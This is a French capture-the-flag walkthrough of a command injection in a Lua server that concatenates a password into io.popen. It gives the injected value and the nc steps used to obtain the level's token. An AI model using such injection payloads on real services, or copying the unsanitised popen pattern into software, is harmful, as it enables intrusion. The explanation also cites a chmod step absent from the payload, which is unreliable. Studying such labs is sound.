# Level11 — Command Injection (Lua io.popen)

## Fichier fourni

```sh
cat ~/level11.lua
```

Un serveur Lua écoute sur `127.0.0.1:5151`. Il attend un mot de passe, calcule son SHA1 et le compare à un hash attendu.

## Reconnaissance

Fonction vulnérable :

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  ...
end
```

`pass` est concaténé directement dans une commande shell sans sanitisation. C'est une **command injection**.

## Vulnérabilité

Si `pass = "; getflag > /tmp/token"`, la commande devient :

```sh
echo ; getflag > /tmp/token | sha1sum
```

- `echo` s'exécute (sortie vide)
- `getflag` s'exécute en tant que `flag11` (SUID) et écrit le token dans `/tmp/token`
- `chmod 777` rend le fichier lisible par `level11`
- `sha1sum` reçoit la sortie vide de chmod (inoffensif)

## Exploitation

```sh
nc 127.0.0.1 5151
# Password: ; getflag > /tmp/token
```

Puis :

```sh
cat /tmp/token
# Check flag.Here is your token : <TOKEN>
```

```sh
su flag11   # password = token affiché
getflag
```

## Token

Voir `../flag`.
